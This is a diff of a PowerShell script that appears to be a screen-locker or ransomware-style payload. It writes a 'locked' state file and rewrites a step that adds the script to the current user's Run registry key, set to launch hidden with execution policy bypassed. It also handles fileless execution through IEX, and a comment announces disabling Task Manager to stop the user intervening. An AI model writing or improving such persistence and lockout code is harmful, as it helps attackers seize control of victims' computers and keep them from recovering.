@@ -31,16 +31,14 @@ if (Test-Path $LockFile) {
 # Mark state as locked in the file:
 "locked" | Out-File -FilePath $LockFile -Force
 
-# Add this script to startup (current user Run key)
-try {
-    # Determine the full path to this script
-    $ScriptPath = $MyInvocation.MyCommand.Path
-    if (-not $ScriptPath) { $ScriptPath = $PSCommandPath }  # Fallback for older PS versions
-    $startCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+# Add this script to startup (only if running from a file)
+if ($MyInvocation.MyCommand.Path) {
+    $startCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
     Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Type String -Force
-} catch {
-    Write-Warning "Failed to add startup registry entry: $_"
+} else {
+    Write-Warning "Script is running via IEX or memory; cannot register startup."
 }
+
 
 # Disable Task Manager (to prevent Ctrl+Alt+Del > Task Manager).
 # Create the Policies\System key if missing, then set DisableTaskMgr = 1.
